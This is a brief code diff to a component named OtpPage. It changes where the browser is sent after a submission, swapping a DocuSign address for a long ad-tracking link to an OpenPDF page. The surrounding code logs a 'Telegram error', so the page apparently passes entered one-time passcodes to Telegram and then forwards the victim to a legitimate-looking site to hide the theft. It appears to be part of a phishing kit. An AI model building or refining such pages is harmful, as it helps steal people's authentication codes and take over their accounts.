@@ -59,7 +59,7 @@ export default function OtpPage() {
       // small delay so the spinner is perceptible (adjust 400–1200ms as you like)
       await new Promise((r) => setTimeout(r, 700));
 
-      window.location.href = "https://www.docusign.com/ip";
+      window.location.href = "https://openpdf.com/lp/edit-pdf.html?uh=OpenPDF:%20Better%20and%20Faster&account=678-774-5919&campaignid=23743194221&adgroupid=200928289808&keyword=adobe%20edit%20pdf&gclid=CjwKCAjw1IHTBhAaEiwA4AYNFvMvOj0a8YUzJCZVWvE7Rhsr-2t5u73nS7zOGidXzxsrl9M0dd9PTxoCLkAQAvD_BwE&source=g&matchtype=e&location=1029654&caid=846852869&gad_source=1&gad_campaignid=23743194221&gbraid=0AAAAAoRIeI3Ibj-lMHBvo6gKPaFBunXkU";
     } catch (err) {
       console.error("Telegram error:", err);
       setError(err instanceof Error ? err.message : "Network error. Try again later.");
